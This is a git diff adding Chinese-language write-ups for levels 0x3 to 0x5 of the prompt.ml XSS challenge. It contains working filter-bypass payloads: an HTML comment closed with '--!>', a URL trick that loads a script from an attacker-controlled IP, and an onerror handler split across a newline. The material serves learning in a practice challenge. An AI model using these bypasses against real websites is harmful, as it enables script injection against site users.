@@ -18,3 +18,22 @@ http://prompt.ml/0
 ```
 <svg><script>prompt&#x28;1)</script>
 ```
+
+# 0x3
+服务器端将”->“转换成“_”是为了防止闭合注释，但“\<!--”可以通过“-->”和“--!>”两种方式闭合：
+```
+--!><script type=text/javascript>prompt(1)</script>
+```
+
+# 0x4
+匹配前面的URL格式绕过正则，并使用%2f绕过decodeURIComponent函数，最后使用自己的服务器上在js文件中写入prompt(1)：
+```
+http://prompt.ml%2f@http://xx.xx.xx.xx/1.js
+```
+
+# 0x5
+“>”和“on=xxx“被正则转义，通过将type覆盖为image，并通过换行绕过正则：
+```
+" type=image src onerror
+="prompt(1)
+```
